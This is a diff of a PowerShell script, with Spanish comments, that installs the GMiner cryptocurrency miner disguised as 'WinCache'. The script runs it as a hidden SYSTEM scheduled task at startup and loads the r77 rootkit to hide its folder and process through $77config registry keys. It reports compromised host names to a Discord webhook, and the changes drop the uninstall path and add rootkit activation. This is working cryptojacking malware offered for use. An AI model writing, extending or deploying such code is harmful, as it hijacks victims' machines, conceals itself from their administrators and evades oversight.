@@ -1,12 +1,10 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Deploys and runs GMiner using Task Scheduler with DACL protection.
-    Sends real-time logs to Discord for full debugging.
+    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
+    Includes Safe Update and r77 Rootkit. (NO Critical Process)
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
-.EXAMPLE
-    .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
 param(
@@ -15,7 +13,6 @@ param(
     [string]$Algo,
     [string]$Worker,
     [string]$DiscordWebhook,
-    [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
     [switch]$Diagnose,
@@ -37,47 +34,9 @@ $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
 # ---------- helpers ---------------------------------------------------------
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Security.AccessControl;
-using System.Security.Principal;
-
-public static class ProcessProtector {
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, byte[] pSecurityDescriptor);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetCurrentProcess();
-
-    public static bool ProtectProcessDacl() {
-        try {
-            IntPtr hProcess = GetCurrentProcess();
-            RawSecurityDescriptor rawSd = new RawSecurityDescriptor(
-                ControlFlags.DiscretionaryAclPresent | ControlFlags.SelfRelative,
-                new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
-                new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null),
-                null,
-                new DiscretionaryAcl(false, false, 0)
-            );
-            DiscretionaryAcl dacl = (DiscretionaryAcl)rawSd.DiscretionaryAcl;
-            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
-            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
-            rawSd.DiscretionaryAcl = dacl;
-            byte[] sdBytes = new byte[rawSd.BinaryLength];
-            rawSd.GetBinaryForm(sdBytes, 0);
-            return SetKernelObjectSecurity(hProcess, 4, sdBytes);
-        } catch { return false; }
-    }
-}
-"@
-
 function Send-DiscordWebhook {
     param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
     if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
-    # Discord tiene un límite de 4096 caracteres por descripción
-    if ($Message.Length -gt 4000) { $Message = $Message.Substring(0, 3990) + "`n... [Truncado]" }
-    
     $payload = [ordered]@{
         embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
     } | ConvertTo-Json -Depth 4 -Compress
@@ -86,6 +45,17 @@ function Send-DiscordWebhook {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
         return $true
     } catch { return $false }
+}
+
+function Stop-Safe {
+    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    foreach ($w in $watchers) {
+        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 1
+    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
 # ---------- test webhook ----------------------------------------------------
@@ -141,86 +111,17 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
-# ---------- stop safe -------------------------------------------------------
-function Stop-Safe {
-    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
-    
-    $sd = (New-Object System.Security.AccessControl.DirectorySecurity)
-    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;AU)"
-    try {
-        $taskService = New-Object -ComObject "Schedule.Service"
-        $taskService.Connect()
-        $folder = $taskService.GetFolder("\")
-        $task = $folder.GetTask("\$TaskName")
-        if ($task) { $task.SetSecurityDescriptor($sddl, 0) }
-    } catch {}
-
-    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) { Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue }
-    
-    Start-Sleep -Seconds 1
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-}
-
-if ($Uninstall) {
-    Stop-Safe
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    
-    try {
-        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
-        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
-    } catch {}
-    
-    Write-Host '[+] Desinstalado correctamente.'
-    return
-}
-
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
     if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }
 
-    # Variables para el buffer de logs a Discord
-    $logBuffer = New-Object System.Collections.ArrayList
-    $lastDiscordSend = Get-Date
-
     function Write-Session {
         param([string]$Msg, [string]$Level = 'INFO')
-        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        $formatted = "$ts [$Level] $Msg"
-        
-        # 1. Guardar siempre en disco
-        Add-Content -Path $LogFile -Value $formatted -Encoding UTF8
-
-        # 2. Enviar a Discord
-        if ($DiscordWebhook) {
-            if ($Level -eq 'FATAL' -or $Level -eq 'WARN') {
-                # Errores: Envío inmediato
-                $color = if ($Level -eq 'FATAL') { 15158332 } else { 16776960 }
-                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "🚨 Log [$Level]" -Message $formatted -Color $color | Out-Null
-            } else {
-                # Info normal: Acumular en buffer
-                [void]$logBuffer.Add($formatted)
-                if ((Get-Date) - $lastDiscordSend -gt [TimeSpan]::FromSeconds(30)) {
-                    if ($logBuffer.Count -gt 0) {
-                        $chunk = $logBuffer -join "`n"
-                        Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "📝 Logs (Últimos 30s)" -Message $chunk -Color 3066993 | Out-Null
-                        $logBuffer.Clear()
-                    }
-                    $lastDiscordSend = Get-Date
-                }
-            }
-        }
+        Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
     }
 
     Write-Session "Watcher iniciado (PID $PID)."
-    
-    # --- DACL: Proteger el proceso actual ---
-    $aclStatus = [ProcessProtector]::ProtectProcessDacl()
-    if ($aclStatus) { Write-Session "Watcher protegido con DACL." } else { Write-Session "No se pudo aplicar DACL." 'WARN' }
 
     # --- ROOTKIT ---
     try {
@@ -228,9 +129,11 @@ if ($Run) {
         $asm = [Reflection.Assembly]::Load($bytes)  
         $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
         $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
-        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String'); $rk.Close()  
+        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String')  
+        $rk.Close()  
         $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
-        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord'); $rk.Close()  
+        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord')  
+        $rk.Close()  
         Write-Session "Rootkit r77 cargado y configurado."
     } catch { Write-Session "Error en rootkit: $_" 'WARN' }
 
@@ -240,7 +143,7 @@ if ($Run) {
     $notifiedStart = $false
 
     while ($true) {
-        Write-Session "Lanzando minero (intento $($restarts + 1))..."
+        Write-Session "launching miner (attempt $($restarts + 1))"
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $ExePath; $psi.Arguments = $argStr; $psi.WorkingDirectory = $Root
         $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.CreateNoWindow = $true
@@ -255,12 +158,12 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Rootkit Activado)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
         } catch {
-            Write-Session "Fallo crítico al iniciar el proceso: $_" 'FATAL'
+            Write-Session "Fallo al iniciar: $_" 'FATAL'
             break
         }
 
@@ -271,26 +174,17 @@ if ($Run) {
         while (-not $proc.HasExited -or -not $q.IsEmpty) {
             $line = $null
             if ($q.TryDequeue([ref]$line)) {
-                # Enviamos cada línea del minero a la función Write-Session
                 $lvl = if ($line -match $fatalRe) { 'FATAL' } else { 'INFO' }
-                Write-Session "MINER: $line" $lvl
-            } else { 
-                Start-Sleep -Milliseconds 200 
-            }
+                Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$lvl] $line" -Encoding UTF8
+            } else { Start-Sleep -Milliseconds 200 }
         }
 
         $proc.WaitForExit()
         Unregister-Event -SourceIdentifier $sub.Name -ErrorAction SilentlyContinue
         $proc.Dispose()
         
-        Write-Session "El minero se detuvo (Código de salida: $($proc.ExitCode))." 'WARN'
-        
         $restarts++
-        if ($restarts -ge 10) { 
-            Write-Session "Se alcanzaron 10 reinicios. Deteniendo por seguridad." 'FATAL'
-            break 
-        }
-        Write-Session "Reiniciando en 30 segundos..."
+        if ($restarts -ge 10) { break }
         Start-Sleep -Seconds 30
     }
     exit 0
@@ -341,7 +235,7 @@ $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
 
 # ---------- safe update & scheduled task ------------------------------------
-Write-Host '[*] Actualizando instalación...'
+Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
 Stop-Safe
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
@@ -349,39 +243,24 @@ $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Self
 if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
 $argList += " -Run -NoElevate"
 
-Write-Host '[*] Registrando Tarea Programada...'
 $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null
+Write-Host "[+] Tarea programada actualizada."
 
-# --- PROTECCIÓN DE LA TAREA (DACL) ---
-Write-Host '[*] Aplicando DACL a la Tarea Programada...'
-try {
-    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(D;;DC;;;AU)"
-    $taskService = New-Object -ComObject "Schedule.Service"
-    $taskService.Connect()
-    $folder = $taskService.GetFolder("\")
-    $task = $folder.GetTask("\$TaskName")
-    $task.SetSecurityDescriptor($sddl, 0)
-    Write-Host '[+] Tarea protegida.'
-} catch {
-    Write-Warning "No se pudo aplicar DACL a la tarea: $_"
+# ---------- launch watcher --------------------------------------------------
+$p = $null
+if ($Foreground) {
+    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
+} else {
+    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
+    Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
 }
-
-Write-Host '[*] Iniciando Tarea...'
-Start-ScheduledTask -TaskName $TaskName
 
 if ($DiscordWebhook) {
-    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Tarea Instalada y Protegida."
-    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Exitosa" -Message $msg -Color 3066993 | Out-Null
+    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado."
+    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Actualización Exitosa" -Message $msg -Color 3066993 | Out-Null
 }
-
-Write-Host ''
-Write-Host '=================================================='
-Write-Host '  Tarea Programada instalada y protegida.'
-Write-Host "  Install : $Root"
-Write-Host "  Log     : $LogFile"
-Write-Host '=================================================='
